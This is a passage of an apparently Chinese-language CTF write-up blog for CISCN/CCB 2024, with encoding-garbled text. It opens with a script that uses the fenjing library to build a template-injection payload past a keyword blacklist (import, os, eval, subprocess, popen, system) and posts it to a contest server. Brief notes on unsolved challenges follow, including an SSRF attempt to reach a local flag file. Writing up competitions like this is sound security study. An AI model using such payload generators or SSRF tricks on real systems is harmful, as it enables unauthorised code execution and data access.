        <span class="token string">'\\'</span> <span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>


full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>
payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>
    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"è¿™ä¸ªpayloadä¸ä¼šäº§ç”Ÿå›æ˜¾"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    <span class="token string">"http://47.93.212.188:32936"</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215100840684.png" alt="image-20241215100840684"></p>
<hr>
<h1 id="sxweb1ï¼ˆUnsolvedï¼‰"><a href="#sxweb1ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb1ï¼ˆUnsolvedï¼‰"></a>sxweb1ï¼ˆUnsolvedï¼‰</h1><p>Apache&#x2F;2.4.58</p>
<p>ç›´æ¥è®¿é—® publishers.phpï¼Œè¿”å›<code>more lines returned. maybe SQL injection Attack</code></p>
<hr>
<h1 id="easywebï¼ˆUnsolvedï¼‰"><a href="#easywebï¼ˆUnsolvedï¼‰" class="headerlink" title="easywebï¼ˆUnsolvedï¼‰"></a>easywebï¼ˆUnsolvedï¼‰</h1><p>è¿›å»403ï¼Œå¼€æ‰«</p>
<p>æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ¥å£å’Œä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„æ¥å£</p>
<p>ä¸‹è½½æ–‡ä»¶é™åˆ¶åç¼€ä¸º .txt å’Œ .zip</p>
<p>ä¸Šä¼ æ–‡ä»¶é™åˆ¶åç¼€ä¸ºå›¾ç‰‡ä¸”æ— å›æ˜¾è·¯å¾„</p>
<hr>
<h1 id="sxweb2ï¼ˆUnsolvedï¼‰"><a href="#sxweb2ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb2ï¼ˆUnsolvedï¼‰"></a>sxweb2ï¼ˆUnsolvedï¼‰</h1><p>çœ‹èµ·æ¥åƒæ˜¯ 1 çš„è¿›é˜¶ç‰ˆï¼Œå®é™…ä¸Š 1 è¿˜æ˜¯0è§£</p>
<p>è¿›å»å‘ç°è·¯å¾„ç›´æ¥åœ¨ &#x2F;cgi-bin&#x2F;index.py äº†</p>
<p>å•ç‹¬è®¿é—® &#x2F;cgi-bin&#x2F; å¾—åˆ°</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/
    html/
        index.html
        apache.jpg
    db/
        pubs.db
    cgi-bin/
        local/
            flag.py
        index.cgi
        authors.py
        index.py
        wget.py
        update_authorsform.py
        updateauthor.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†æ˜¯ç›´æ¥è®¿é—® &#x2F;cgi-bin&#x2F;local&#x2F;flag.py ä¼šè¿”å›403</p>
<p>å°è¯•é€šè¿‡ wget.py è®¿é—® 127.0.0.1&#x2F;cgi-bin&#x2F;local&#x2F;flag.py ï¼Œè¿”å› Notice: local access is not allowed</p>
<p>&#x2F;bin&#x2F;authors.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210603673.png" alt="image-20241215210603673"></p>
<p>&#x2F;cgi-bin&#x2F;update_authorsform.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210619778.png" alt="image-20241215210619778"></p>
<p>&#x2F;cgi-bin&#x2F;updateauthor.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210707260.png" alt="image-20241215210707260"></p>
<hr>
<h1 id="BookManagerï¼ˆUnsolvedï¼‰"><a href="#BookManagerï¼ˆUnsolvedï¼‰" class="headerlink" title="BookManagerï¼ˆUnsolvedï¼‰"></a>BookManagerï¼ˆUnsolvedï¼‰</h1>
    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: 'å†™ç‚¹ä»€ä¹ˆå§(â—Ë‡âˆ€Ë‡â—)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 é›²æµã®Lowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>